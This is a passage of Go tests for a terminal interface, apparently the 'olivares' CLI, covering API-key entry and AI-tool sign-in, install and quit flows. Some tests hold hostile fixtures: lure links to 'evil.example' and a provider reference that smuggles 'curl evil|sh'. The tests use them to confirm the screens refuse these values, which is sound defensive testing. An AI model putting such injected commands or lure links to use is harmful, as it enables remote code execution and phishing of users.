	j.press("\x1b[C")      // Right: Anthropic becomes OpenAI
	j.press(keyEnterBytes) // to the key
	j.typeText(uiOpenAIKey)
	j.press(keyEnterBytes) // to the name
	j.typeText("Work")
	j.press(keyEnterBytes) // send
	j.see("Connection test: works.")
	j.press(keyCtrlDBytes)
	if code := j.finish(wait); code != 0 {
		t.Fatalf("exited %d, want 0", code)
	}
	want := []string{
		`POST /v1/m/sessions/providers {"api_key":"<api_key>","base_url":"","display_name":"Work","kind":"openai"}`,
		`POST /v1/m/sessions/providers/prv_01/test {}`,
	}
	if got := e.ledger(); !reflect.DeepEqual(got, want) {
		t.Errorf("ledger = %q, want %q", got, want)
	}
}

// With no engine answering, Get started and AI tools keep naming the command
// that gets there; they do not open a screen that has nothing to read.
func TestToolsScreensStayOnTheCommandsWithoutAnEngine(t *testing.T) {
	e := newUIEngine(t)
	e.Close()
	j, wait := startUIJourney(t, e)
	j.see("Get started")
	j.press(keyEnterBytes)
	j.see("Use: ")
	j.press(keyCtrlDBytes)
	if code := j.finish(wait); code != 0 {
		t.Fatalf("exited %d, want 0", code)
	}
	if strings.Contains(j.transcript.String(), "Reading the engine") {
		t.Error("a screen opened with no engine to read")
	}
}

// The link a person opens is the engine's text. One that is not a plain https
// address is never drawn, and the sign-in ends on the engine.
func TestToolsScreensRefuseASignInLinkThatIsNotPlainHTTPS(t *testing.T) {
	e := newUIEngine(t)
	e.set(func() { e.installed["codex"] = true; e.signInURL = "http://evil.example/login" })
	j, wait := startUIJourney(t, e)
	j.see("Get started")
	j.press("\x1b[B") // AI tools
	j.press(keyEnterBytes)
	j.see("Not installed  [ Install ]")
	j.search("Codex")
	j.press(keyEnterBytes)
	j.see("is not a plain https address")
	select {
	case <-e.deleted:
	case <-time.After(ptyWait):
		t.Fatal("the sign-in with a link nobody may open stayed open on the engine")
	}
	j.press(keyCtrlDBytes)
	if code := j.finish(wait); code != 0 {
		t.Fatalf("exited %d, want 0", code)
	}
	if strings.Contains(termrender.StripANSI(j.transcript.String()), "evil.example") {
		t.Error("the screen drew a link that is not a plain https address")
	}
}

// The code a device sign-in shows is the engine's text, drawn beside the link. One
// that carries another address is never drawn, and the sign-in ends on the engine.
func TestToolsScreensRefuseASignInCodeThatCarriesAnotherAddress(t *testing.T) {
	e := newUIEngine(t)
	e.set(func() { e.installed["codex"] = true; e.userCode = "ABCD-1234 or open https://evil.example/go" })
	j, wait := startUIJourney(t, e)
	j.see("Get started")
	j.press("\x1b[B") // AI tools
	j.press(keyEnterBytes)
	j.see("Not installed  [ Install ]")
	j.search("Codex")
	j.press(keyEnterBytes)
	j.see("is not shown")
	select {
	case <-e.deleted:
	case <-time.After(ptyWait):
		t.Fatal("the sign-in with a code nobody may read stayed open on the engine")
	}
	j.press(keyCtrlDBytes)
	if code := j.finish(wait); code != 0 {
		t.Fatalf("exited %d, want 0", code)
	}
	if strings.Contains(termrender.StripANSI(j.transcript.String()), "evil.example") {
		t.Error("the screen drew a second address from the sign-in code")
	}
}

// A provider reference is the engine's text. One that is not a plain name is not
// put into a command the page tells the person to run, and no request is made
// with it.
func TestToolsScreensNeverPutAnOddProviderRefInACommand(t *testing.T) {
	e := newUIEngine(t)
	e.set(func() { e.providerRef = "prv_01; curl evil|sh" })
	j, wait := startUIJourney(t, e)
	j.see("Get started")
	j.press("\x1b[B") // AI tools
	j.press(keyEnterBytes)
	j.see("Not installed  [ Install ]")
	j.typeText("jjjjj") // past the five tools, to Add an API key
	j.press(keyEnterBytes)
	j.see("The key is never shown")
	j.typeKey(uiTestKey)
	mark := j.transcript.Len()
	j.see("Enter goes back.") // the footer is drawn last: the page is whole
	page := termrender.StripANSI(j.transcript.String()[mark:])
	if !strings.Contains(page, "Connection test: not tested.") || !strings.Contains(page, "olivares provider ls") {
		t.Errorf("the page does not send the person to the list:\n%s", page)
	}
	j.press(keyCtrlDBytes)
	if code := j.finish(wait); code != 0 {
		t.Fatalf("exited %d, want 0", code)
	}
	if screen := termrender.StripANSI(j.transcript.String()); strings.Contains(screen, "curl evil") {
		t.Error("the screen drew the provider reference as part of a command")
	}
	if got := e.ledger(); len(got) != 1 || !strings.HasPrefix(got[0], "POST /v1/m/sessions/providers {") {
		t.Errorf("writes = %q, want only the add: no request may name the odd reference", got)
	}
}

// An install the engine accepted, whose job the screen then cannot follow, may
// still be running: the page says so instead of showing a plain failure.
func TestToolsScreensSayAnInstallMayStillRunWhenItsJobCannotBeFollowed(t *testing.T) {
	e := newUIEngine(t)
	e.set(func() { e.jobPollDown = true })
	j, wait := startUIJourney(t, e)
	j.see("Get started")
	j.press(keyEnterBytes)
	j.see("1 of 3 done. Next: olivares tool install claude")
	j.press(keyEnterBytes) // install it
	j.see("Claude Code may still be installing on the engine")
	j.press(keyCtrlDBytes)
	if code := j.finish(wait); code != 0 {
		t.Fatalf("exited %d, want 0", code)
	}
}

// A link that is refused ends the sign-in on the engine. When the engine does not
// confirm it, the page the person is on says the login is still open.
func TestToolsScreensSayWhenARefusedSignInCouldNotBeEnded(t *testing.T) {
	e := newUIEngine(t)
	e.set(func() { e.installed["codex"] = true; e.signInURL = "http://evil.example/login"; e.deleteFails = true })
	j, wait := startUIJourney(t, e)
	j.see("Get started")
	j.press("\x1b[B") // AI tools
	j.press(keyEnterBytes)
	j.see("Not installed  [ Install ]")
	j.search("Codex")
	j.press(keyEnterBytes)
	mark := j.transcript.Len()
	j.see("Enter goes back.")
	// The terminal wraps the sentence at 80 columns: compare it without the breaks.
	page := strings.Join(strings.Fields(termrender.StripANSI(j.transcript.String()[mark:])), " ")
	for _, want := range []string{"is not a plain https address", "could not be ended on the engine", "ends by itself within 15 minutes"} {
		if !strings.Contains(page, want) {
			t.Errorf("the page lacks %q:\n%s", want, page)
		}
	}
	if strings.Contains(page, "The sign-in was ended") {
		t.Error("the page says the sign-in was ended, and the engine refused to end it")
	}
	j.press(keyCtrlDBytes)
	if code := j.finish(wait); code != 0 {
		t.Fatalf("exited %d, want 0", code)
	}
	if strings.Contains(termrender.StripANSI(j.transcript.String()), "evil.example") {
		t.Error("the screen drew a link that is not a plain https address")
	}
}

// Quitting closes the screens, so the list cannot say a sign-in is still open:
// the command does, after the terminal is restored.
func TestToolsScreensSayAfterQuittingWhenASignInCouldNotBeEnded(t *testing.T) {
	e := newUIEngine(t)
	e.set(func() { e.installed["codex"] = true; e.deleteFails = true })
	j, wait := startUIJourney(t, e)
	j.see("Get started")
	j.press("\x1b[B") // AI tools
	j.press(keyEnterBytes)
	j.see("Not installed  [ Install ]")
	j.search("Codex")
	j.press(keyEnterBytes)
	j.see("Waiting for you to finish on the sign-in page")
	j.press(keyCtrlDBytes)
	if code := j.finish(wait); code != 0 {
		t.Fatalf("exited %d, want 0", code)
	}
	if out := termrender.StripANSI(j.transcript.String()); !strings.Contains(out, "ends by itself within 15 minutes") {
		t.Errorf("the person quit and was not told the sign-in is still open:\n%s", out)
	}
}

// A signal ends the process without Run returning, so what the screens kept is
// said by the signal's own exit: a person whose terminal was told to end is
// still told a sign-in stays open.
func TestToolsScreensSayAfterASignalWhenASignInCouldNotBeEnded(t *testing.T) {
	e := newUIEngine(t)
	e.set(func() { e.installed["codex"] = true; e.deleteFails = true })
	j, wait := startUIJourney(t, e)
	j.see("Get started")
	j.press("\x1b[B") // AI tools
	j.press(keyEnterBytes)
	j.see("Not installed  [ Install ]")
	j.search("Codex")
	j.press(keyEnterBytes)
	j.see("Waiting for you to finish on the sign-in page")
	if err := syscall.Kill(j.pid, syscall.SIGTERM); err != nil {
		t.Fatalf("send SIGTERM: %v", err)
	}
	if code := j.finish(wait); code != 128+int(syscall.SIGTERM) {
		t.Fatalf("SIGTERM exited %d, want %d", code, 128+int(syscall.SIGTERM))
	}
	if out := termrender.StripANSI(j.transcript.String()); !strings.Contains(out, "ends by itself within 15 minutes") {
		t.Errorf("a signal ended the process and the person was not told the sign-in is still open:\n%s", out)
	}
}

// Claude Code asks for a pasted code: leaving at that step ends the login on the
// engine like leaving a device sign-in does.
func TestToolsScreensEndAClaudeCodeSignInWaitingForTheCode(t *testing.T) {
	e := newUIEngine(t)
	e.set(func() { e.installed["claude"] = true })
	j, wait := startUIJourney(t, e)
	j.see("Get started")
	j.press(keyEnterBytes)
	j.see("2 of 3 done. Next: olivares tool login claude")
	j.press(keyEnterBytes) // sign it in
	j.see("Paste the code the page shows")
	j.press(keyEscBytes)
	select {
	case <-e.deleted:
	case <-time.After(ptyWait):
		t.Fatal("leaving the code step left the sign-in open on the engine")
	}
	j.press(keyCtrlDBytes)
	if code := j.finish(wait); code != 0 {
		t.Fatalf("exited %d, want 0", code)
	}
}

// openCodexSignIn goes from the main menu to Codex's sign-in, which waits on the
// person with a link and a code.
func (j *uiJourney) openCodexSignIn() {
	j.t.Helper()
	j.see("Get started")
	j.press("\x1b[B") // AI tools
	j.press(keyEnterBytes)
	j.see("Not installed  [ Install ]")
	j.search("Codex")
	j.press(keyEnterBytes)
	j.see("Waiting for you to finish on the sign-in page")
}

// A device sign-in the engine reports finished ends on the screen as it does in
// the command: the tool reads as signed in, and the screen made the writes the
// command makes, with nothing to end on the engine.
func TestToolsScreensFinishADeviceSignInTheEngineCompleted(t *testing.T) {
	e := newUIEngine(t)
	e.set(func() { e.installed["codex"] = true })
	j, wait := startUIJourney(t, e)
	j.openCodexSignIn()
	e.set(func() { e.deviceState = "signed_in" }) // the person finished on the page
	j.see("Codex is signed in.")
	j.press(keyCtrlDBytes)
	if code := j.finish(wait); code != 0 {
		t.Fatalf("exited %d, want 0", code)
	}
	wantLedger := []string{`POST /v1/m/agenttools/sign-in {"driver":"codex","tenant_id":"tenant-a"}`}
	if got := e.ledger(); !reflect.DeepEqual(got, wantLedger) {
		t.Errorf("the screen's writes are\n%q\nwant\n%q", got, wantLedger)
	}

	c := newUIEngine(t)
	c.set(func() { c.installed["codex"] = true; c.deviceState = "signed_in" })
	if _, errb, err := execSessionCLI(t, strings.NewReader(""), append([]string{"tool", "login", "codex"}, sessionCreds(c.URL)...)...); err != nil {
		t.Fatalf("olivares tool login codex: %v\n%s", err, errb)
	}
	if got, want := e.ledger(), c.ledger(); !reflect.DeepEqual(got, want) {
		t.Errorf("the screen left a different ledger than the command:\nscreen:  %q\ncommand: %q", got, want)
	}
}

// A device sign-in the tool failed says why, never that it signed in, and ends on
// the engine.
func TestToolsScreensSayWhyADeviceSignInFailed(t *testing.T) {
	e := newUIEngine(t)
	e.set(func() { e.installed["codex"] = true })
	j, wait := startUIJourney(t, e)
	j.openCodexSignIn()
	e.set(func() { e.deviceState = "failed" })
	j.see("Codex is not signed in. The device code expired. Start the sign-in again.")
	select {
	case <-e.deleted:
	case <-time.After(ptyWait):
		t.Fatal("a failed sign-in was left open on the engine")
	}
	j.press(keyEnterBytes) // back to the list
	j.see("Installed · not signed in")
	j.press(keyCtrlDBytes)
	if code := j.finish(wait); code != 0 {
		t.Fatalf("exited %d, want 0", code)
	}
	if out := termrender.StripANSI(j.transcript.String()); strings.Contains(out, "is signed in.") {
		t.Errorf("a failed sign-in was reported as signed in:\n%s", out)
	}
}

// The main menu's Get started row names the same next step as the screens, also
// after they acted: it is not the step it was when the menu opened.
func TestMainMenuNamesTheNextStepAfterTheScreensActed(t *testing.T) {
	e := newUIEngine(t)
	j, wait := startUIJourney(t, e)
	j.see("Get started")
	j.press(keyEnterBytes)
	j.see("1 of 3 done. Next: olivares tool install claude")
	j.press(keyEnterBytes) // install it
	j.see("2 of 3 done. Next: olivares tool login claude")
	mark := j.transcript.Len()
	j.press(keyEscBytes)
	j.see("(running)") // the main menu's footer
	menu := termrender.StripANSI(j.transcript.String()[mark:])
	if !strings.Contains(menu, "Next: olivares tool login claude") || strings.Contains(menu, "olivares tool install claude") {
		t.Errorf("the main menu after the install is:\n%s", menu)
	}
	j.press(keyCtrlDBytes)
	if code := j.finish(wait); code != 0 {
		t.Fatalf("exited %d, want 0", code)
	}
}

// openAddKey goes from the main menu to the Add an API key page.
func (j *uiJourney) openAddKey() {
	j.t.Helper()
	j.see("Get started")
	j.press("\x1b[B") // AI tools
	j.press(keyEnterBytes)
	j.see("Not installed  [ Install ]")
	j.typeText("jjjjj") // past the five tools, to Add an API key
	j.press(keyEnterBytes)
	j.see("The key is never shown")
}

// A key whose own prefix names another provider is not sent. The engine tests a
// key with the provider the person chose, and a key sent to the wrong vendor is
// a key given to it.
func TestToolsScreensRefuseAKeyThatBelongsToAnotherProvider(t *testing.T) {
	e := newUIEngine(t)
	j, wait := startUIJourney(t, e)
	j.openAddKey()
	j.press("\x1b[C") // Right: Anthropic becomes OpenAI
	j.press(keyEnterBytes)
	j.typeText(uiTestKey) // an Anthropic key
	j.press(keyEnterBytes)
	j.press(keyEnterBytes) // send
	j.see("That key is for Anthropic, not OpenAI.")
	j.press(keyCtrlDBytes)
	if code := j.finish(wait); code != 0 {
		t.Fatalf("exited %d, want 0", code)
	}
	if got := e.ledger(); len(got) != 0 {
		t.Errorf("the key was sent to the wrong provider: %q", got)
	}
	j.assertNeverShown(uiTestKey)
	j.assertNotOnDisk(uiTestKey)
}

// Quitting while the engine has not answered a key leaves the person not knowing
// whether it was sealed. The command says what may be so once the terminal is
// restored.
func TestToolsScreensSayAfterQuittingWhenAKeyMayHaveBeenAdded(t *testing.T) {
	e := newUIEngine(t)
	gate := e.hold("POST", "/v1/m/sessions/providers")
	t.Cleanup(gate.open)
	j, wait := startUIJourney(t, e)
	j.openAddKey()
	j.typeKey(uiTestKey)
	j.see("Sealing the key and testing it") // reading the screen keeps the pty drained
	select {
	case <-gate.arrived:
	case <-time.After(ptyWait):
		t.Fatal("the engine never saw the key")
	}
	j.press(keyCtrlDBytes)
	if code := j.finish(wait); code != 0 {
		t.Fatalf("exited %d, want 0", code)
	}
	if out := termrender.StripANSI(j.transcript.String()); !strings.Contains(out, "A key sent as you left may have been added. Check olivares provider ls.") {
		t.Errorf("the person quit with a key in flight and was not told:\n%s", out)
	}
	j.assertNeverShown(uiTestKey)
	j.assertNotOnDisk(uiTestKey)
}

// The same for a sign-in the engine was asked to start: nobody can end what has
// no id yet, and the login ends by itself within 15 minutes.
func TestToolsScreensSayAfterQuittingWhenASignInMayHaveStarted(t *testing.T) {
	e := newUIEngine(t)
	e.set(func() { e.installed["codex"] = true })
	gate := e.hold("POST", "/v1/m/agenttools/sign-in")
	t.Cleanup(gate.open)
	j, wait := startUIJourney(t, e)
	j.see("Get started")
	j.press("\x1b[B") // AI tools
	j.press(keyEnterBytes)
	j.see("Not installed  [ Install ]")
	j.search("Codex")
	j.press(keyEnterBytes)
	j.see("Starting the Codex sign-in")
	select {
	case <-gate.arrived:
	case <-time.After(ptyWait):
		t.Fatal("the engine never saw the sign-in request")
	}
	j.press(keyCtrlDBytes)
	if code := j.finish(wait); code != 0 {
		t.Fatalf("exited %d, want 0", code)
	}
	if out := termrender.StripANSI(j.transcript.String()); !strings.Contains(out, "The sign-in may have started on the engine. It ends by itself within 15 minutes.") {
		t.Errorf("the person quit with a sign-in being started and was not told:\n%s", out)
	}
}

// An install that the engine accepted goes on without the screens. The page said
// so; after a quit the command says it again.
func TestToolsScreensSayAfterQuittingWhenAnInstallMayStillRun(t *testing.T) {
	e := newUIEngine(t)
	e.set(func() { e.jobHangs = true })
	j, wait := startUIJourney(t, e)
	j.see("Get started")
	j.press(keyEnterBytes)
	j.see("1 of 3 done. Next: olivares tool install claude")
	j.press(keyEnterBytes)
	j.see("Installing Claude Code 2.1.286")
	select {
	case <-e.jobPolled:
	case <-time.After(ptyWait):
		t.Fatal("the engine never saw the install job asked for")
	}
	j.press(keyCtrlDBytes)
	if code := j.finish(wait); code != 0 {
		t.Fatalf("exited %d, want 0", code)
	}
	if out := termrender.StripANSI(j.transcript.String()); !strings.Contains(out, "Claude Code may still be installing on the engine. Check olivares tool ls.") {
		t.Errorf("the person quit during an install and was not told it goes on:\n%s", out)
	}
}

// A sign-in start whose answer cannot be read is not a login that did not start:
// the page says it may have, and that it ends by itself.
func TestToolsScreensSayASignInMayHaveStartedWhenItsAnswerCannotBeRead(t *testing.T) {
	e := newUIEngine(t)
	e.set(func() { e.installed["codex"] = true; e.signInGarbage = true })
	j, wait := startUIJourney(t, e)
	j.see("Get started")
	j.press("\x1b[B") // AI tools
	j.press(keyEnterBytes)
	j.see("Not installed  [ Install ]")
	j.search("Codex")
	j.press(keyEnterBytes)
	mark := j.transcript.Len()
	j.see("Enter goes back.")
	page := strings.Join(strings.Fields(termrender.StripANSI(j.transcript.String()[mark:])), " ")
	if want := "The sign-in may have started on the engine. It ends by itself within 15 minutes."; !strings.Contains(page, want) {
		t.Errorf("the page lacks %q:\n%s", want, page)
	}
	j.press(keyCtrlDBytes)
	if code := j.finish(wait); code != 0 {
		t.Fatalf("exited %d, want 0", code)
	}
}
